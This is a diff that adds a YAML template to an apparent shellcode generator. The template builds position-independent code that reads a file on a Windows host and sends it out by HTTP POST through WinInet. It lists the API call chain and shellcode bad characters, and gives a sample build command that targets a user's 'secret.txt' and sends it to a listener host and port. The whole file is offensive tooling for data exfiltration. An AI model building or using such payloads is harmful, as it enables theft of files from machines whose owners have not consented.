@@ -1,0 +1,25 @@
+template: ir_http_exfil
+# IR workflow: HTTP POST exfiltration via WinInet.
+# CreateFileA(GENERIC_READ) -> VirtualAlloc -> ReadFile loop ->
+# CloseHandle -> InternetOpenA -> InternetConnectA ->
+# HttpOpenRequestA("POST") -> HttpSendRequestA -> InternetCloseHandle x3
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_http_exfil.yaml \
+#       --src "C:\\Users\\target\\secret.txt" \
+#       --lhost 192.168.1.100 --lport 8080 \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - CreateFileA
+  - ReadFile
+  - CloseHandle
+  - VirtualAlloc
+  - InternetOpenA
+  - InternetConnectA
+  - HttpOpenRequestA
+  - HttpSendRequestA
+  - InternetCloseHandle
+  - ExitProcess
